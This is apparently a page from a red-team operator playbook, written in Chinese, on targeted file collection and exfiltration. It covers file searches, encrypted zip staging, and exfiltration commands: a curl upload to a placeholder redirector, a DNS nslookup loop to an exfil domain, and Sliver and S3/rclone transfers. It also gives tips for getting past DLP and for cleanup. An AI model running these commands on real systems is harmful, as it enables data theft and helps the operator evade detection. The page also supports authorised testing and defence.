# 定向收集与外带

> **TECH：** 按任务清单把文件带到操作机  
> **成功：** 指定对象到达，哈希/名单可对上  
> **不是：** 全盘 `find *.docx`、在这里 hashcat、当 C2 用 icmpsh

密钥类文件（kdbx、pem、aws credentials、shadow）→ 交给 `/creds` 分类/破解，本文件只负责 **搬**。

---

## 1. 先写清单

```text
路径或目录
文件类型 / 时间范围
体积上限
是否含可能的密钥（有则拆给 /creds）
```

没有清单不要 `Get-ChildItem C:\`。

Windows 例：

```cmd
dir /s /b C:\Users\jen\Documents\*.xlsx
dir /s /b C:\share\finance
```

Linux 例：

```bash
find /home/jen/Documents /var/www -type f \( -name '*.pdf' -o -name '*.xlsx' \) -mtime -30
```

---

## 2. Staging

```bash
zip -r -e loot.zip ./collect -P '<pass>'
# 或 7z
7z a -p'<pass>' loot.7z ./collect
sha256sum loot.zip
```

Windows：`tar -a -c -f loot.zip collect` 或 7zip。暂存在用户可写目录，外带完删（`cleanup.md`）。

---

## 3. 外带通道

**默认 HTTPS**（C2 `download` 或 curl 到操作者桶）：

```
# Sliver
download /path/loot.zip

curl -X POST -F 'file=@loot.zip' https://REDIR/upload
```

**HTTPS 不可用、体积小：** DNS

```bash
cat secret.txt | base64 | fold -w 50 | while read line; do nslookup "$line.exfil.op.tld"; done
```

只适合短秘密。大文件不要 DNS。

**操作者自己的对象存储：**

```bash
aws s3 cp loot.zip s3://op-bucket/job1/ --profile op
rclone copy loot.zip op:bucket/job1/
```

用操作者控制的桶，不要写进客户的 S3。

ICMP 隧道不当默认外带/C2。

---

## 4. DLP / 体积

```text
先抽清单里的高价值，再考虑整目录
大包切开
加密后的 zip 仍可能被 DLP 按大小/目的域名拦 → 换 C2 download
```

---

## RESTORE

删目标上的 `loot.zip` / `collect/`。操作机保留副本按授权规则。
